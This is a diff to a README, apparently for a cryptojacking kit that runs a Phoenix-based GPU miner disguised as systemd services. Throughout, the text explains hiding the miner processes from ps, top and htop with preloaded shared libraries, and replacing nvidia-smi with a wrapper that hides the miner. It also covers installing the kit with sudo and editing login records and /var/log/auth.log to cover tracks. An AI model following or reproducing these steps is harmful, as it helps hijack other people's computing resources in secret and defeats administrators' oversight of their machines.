@@ -4,7 +4,7 @@
     * nvidia-smi: excludes `systemd-diagnosis` in nvidia-smi panel.
     * systemd-firewall: is an adaptive system resource allocator determines which GPU the slave miners work on.
     * systemd-update: is the same to the `systemd-firewall` but more merciful that only works at midnight.
-    * systemd-diagnosis: is the pool slave miner.
+    * systemd-diagnosis: is the pool slave miner(Phoenix miner main file).
     * libGNU.co hides `systemd-diagnosis` for ps, top ,and htop.
     * libnvidia-glibc.so hides `nl-toolkit` for ps, top ,and htop.
     * libnvidia-openai.so hides `systemd-firewall` for ps, top ,and htop.
@@ -12,8 +12,16 @@
 * source: corresponding source code of the executed file in `./exec`.
 
 ## Installation
+
 run the `Makefile` by `sudo make`. If you want to be blamed, run it without `sudo`. 
 
+## Prerequiste
+### environmental setting
+make sure you have gcc(which is preinstalled in your system) pyinstaller installed
+```bash
+conda activate [your environment]
+pip install pyinstaller
+```
 ### nvidia-smi
 1. please make sure the variable `skip` in `source/nvidia-smi.py` is the same to the **slave miner**'s file name.
 1. rename original `nvidia-smi` by `nl-toolkit` in `/usr/bin`.
@@ -54,3 +62,5 @@ utmpdump -r tmp_output.txt > [logfile]
 
 1. revise `/var/log/auth.log`
 
+### Notations
+to do 
